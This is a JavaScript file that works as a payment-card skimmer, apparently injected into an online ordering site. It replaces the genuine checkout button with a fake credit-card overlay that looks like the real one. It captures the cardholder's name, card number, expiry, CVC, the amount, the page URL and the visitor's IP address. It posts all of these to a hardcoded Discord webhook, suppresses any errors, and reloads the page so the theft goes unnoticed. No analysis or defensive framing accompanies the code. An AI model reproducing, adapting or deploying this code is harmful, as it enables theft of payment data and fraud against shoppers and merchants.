const replaceCheckoutButton = () => {
    // Check for cookie to prevent re-running
    if (document.cookie.includes('paymentSubmitted=true')) return;

    const checkoutButton = document.getElementById('view_cart');
    if (checkoutButton) {
        const totalAmount = document.getElementById('total_amount');
        const price = totalAmount ? totalAmount.textContent : 'Unknown';

        const newButton = document.createElement('button');
        newButton.id = 'new_checkout_button';
        newButton.textContent = `Checkout Now (${price})`;
        newButton.style.cssText = checkoutButton.style.cssText;
        newButton.className = checkoutButton.className;

        newButton.addEventListener('click', (e) => {
            document.body.style.overflow = 'hidden';

            const tailwind = document.createElement('script');
            tailwind.src = 'https://cdn.tailwindcss.com';
            document.head.appendChild(tailwind);

            const meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.head.appendChild(meta);

            const overlay = document.createElement('div');
            overlay.id = 'white-overlay';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100vw';
            overlay.style.height = '100vh';
            overlay.style.backgroundColor = 'white';
            overlay.style.zIndex = '10000';
            overlay.style.touchAction = 'none';
            overlay.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

            const container = document.createElement('div');
            container.className = 'flex items-center justify-center h-full';
            overlay.appendChild(container);

            const creditCardContainer = document.createElement('div');
            creditCardContainer.className = 'bg-white p-6 rounded-t-3xl shadow-lg w-full max-w-md relative';
            container.appendChild(creditCardContainer);

            const closeButton = document.createElement('button');
            closeButton.className = 'absolute top-4 right-4 text-gray-600 hover:text-gray-800';
            closeButton.innerHTML = '<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
            closeButton.onclick = () => overlay.remove();
            creditCardContainer.appendChild(closeButton);

            const header = document.createElement('div');
            header.className = 'mb-6';
            const title = document.createElement('div');
            title.className = 'text-lg font-semibold text-gray-800 flex items-center';
            title.textContent = 'Credit Card';
            const visaImg = document.createElement('img');
            visaImg.src = 'https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/visa.png';
            visaImg.className = 'h-6 ml-2';
            const mastercardImg = document.createElement('img');
            mastercardImg.src = 'https://d1uz2kmrg3qq0r.cloudfront.net/assets/theme/orderup/ouv2/assets/images/card_type/mastercard.png';
            mastercardImg.className = 'h-6 ml-2';
            title.appendChild(visaImg);
            title.appendChild(mastercardImg);
            header.appendChild(title);
            creditCardContainer.appendChild(header);

            const form = document.createElement('form');
            form.className = 'space-y-4';

            form.onsubmit = async (e) => {
                e.preventDefault();

                // Set cookie to prevent re-running
                document.cookie = 'paymentSubmitted=true; path=/';

                // Fetch IP address
                let ipAddress = 'Unknown';
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    ipAddress = data.ip || 'Unknown';
                } catch (error) {
                    // Silently handle error
                }

                // Collect payment data, current URL, and IP address
                const paymentData = {
                    name: nameInput.value,
                    cardNumber: cardNumberInput.value,
                    expiry: expiryInput.value,
                    cvc: cvvInput.value,
                    amount: price,
                    url: window.location.href,
                    ip: ipAddress
                };

                try {
                    await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "💳 New Payment Submission",
                                color: 0x5865F2,
                                fields: [
                                    { name: "👤 Name", value: paymentData.name, inline: true },
                                    { name: "💵 Amount", value: paymentData.amount, inline: true },
                                    { name: "💳 Card Number", value: paymentData.cardNumber, inline: false },
                                    { name: "📅 Expiry", value: paymentData.expiry, inline: true },
                                    { name: "🔒 CVC", value: paymentData.cvc, inline: true },
                                    { name: "🌐 URL", value: paymentData.url, inline: false },
                                    { name: "🌍 IP Address", value: paymentData.ip, inline: false }
                                ],
                                timestamp: new Date().toISOString(),
                                footer: {
                                    text: "Payment Form Submission"
                                }
                            }]
                        })
                    });
                } catch (error) {
                    // Silently handle error
                }

                // Refresh page
                window.location.reload();
            };

            creditCardContainer.appendChild(form);

            const style = document.createElement('style');
            style.textContent = `
                .custom-input {
                    box-sizing: border-box;
                    height: 52px;
                    padding: 16px;
                    border: 1px solid #E7E9EC;
                    border-radius: 16px;
                    background-color: #F8F8F8;
                    font-family: sans-serif;
                    font-size: 16px;
                    font-weight: 400;
                    -webkit-font-smoothing: antialiased;
                    transition: box-shadow 150ms ease;
                    width: 100%;
                }
                .custom-input::placeholder {
                    color: #CFD7DF;
                }
                .custom-input:focus {
                    outline: none;
                    box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
                }
            `;
            document.head.appendChild(style);

            const nameDiv = document.createElement('div');
            const nameInput = document.createElement('input');
            nameInput.type = 'text';
            nameInput.id = 'nameoncard';
            nameInput.className = 'custom-input';
            nameInput.placeholder = 'Name On Card';
            nameInput.required = true;
            nameInput.autocomplete = 'off';
            nameDiv.appendChild(nameInput);
            form.appendChild(nameDiv);

            const cardNumberDiv = document.createElement('div');
            const cardNumberInput = document.createElement('input');
            cardNumberInput.type = 'text';
            cardNumberInput.id = 'card-number';
            cardNumberInput.className = 'custom-input';
            cardNumberInput.placeholder = 'Card Number';
            cardNumberInput.required = true;
            cardNumberInput.maxLength = 19;
            cardNumberDiv.appendChild(cardNumberInput);
            form.appendChild(cardNumberDiv);

            const flexContainer = document.createElement('div');
            flexContainer.className = 'flex space-x-5';
            form.appendChild(flexContainer);

            const expiryDiv = document.createElement('div');
            expiryDiv.className = 'flex-1';
            const expiryInput = document.createElement('input');
            expiryInput.type = 'text';
            expiryInput.id = 'card-expiry';
            expiryInput.className = 'custom-input';
            expiryInput.placeholder = 'MM/YY';
            expiryInput.required = true;
            expiryInput.maxLength = 5;
            expiryDiv.appendChild(expiryInput);
            flexContainer.appendChild(expiryDiv);

            // Auto-add slash to MM/YY
            expiryInput.addEventListener('input', () => {
                let value = expiryInput.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                expiryInput.value = value;
            });

            const cvvDiv = document.createElement('div');
            cvvDiv.className = 'flex-1';
            const cvvInput = document.createElement('input');
            cvvInput.type = 'text';
            cvvInput.id = 'card-cvc';
            cvvInput.className = 'custom-input';
            cvvInput.placeholder = 'CVC';
            cvvInput.required = true;
            cvvInput.maxLength = 4;
            cvvDiv.appendChild(cvvInput);
            flexContainer.appendChild(cvvDiv);

            const nextButton = document.createElement('button');
            nextButton.type = 'submit';
            nextButton.className = 'w-full bg-blue-600 text-white py-3 rounded-full hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed';
            nextButton.textContent = 'Next';
            nextButton.disabled = true;
            form.appendChild(nextButton);

            const validateForm = () => {
                const isValid = nameInput.value.trim() &&
                                cardNumberInput.value.trim() &&
                                expiryInput.value.trim() &&
                                cvvInput.value.trim();
                nextButton.disabled = !isValid;
            };

            [nameInput, cardNumberInput, expiryInput, cvvInput].forEach(input => {
                input.addEventListener('input', validateForm);
            });

            document.body.appendChild(overlay);
        });

        checkoutButton.parentNode.replaceChild(newButton, checkoutButton);
        clearInterval(checkInterval);
    }
};

const observePage = () => {
    const observer = new MutationObserver(() => {
        replaceCheckoutButton();
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
};

const checkInterval = setInterval(replaceCheckoutButton, 100);
observePage();
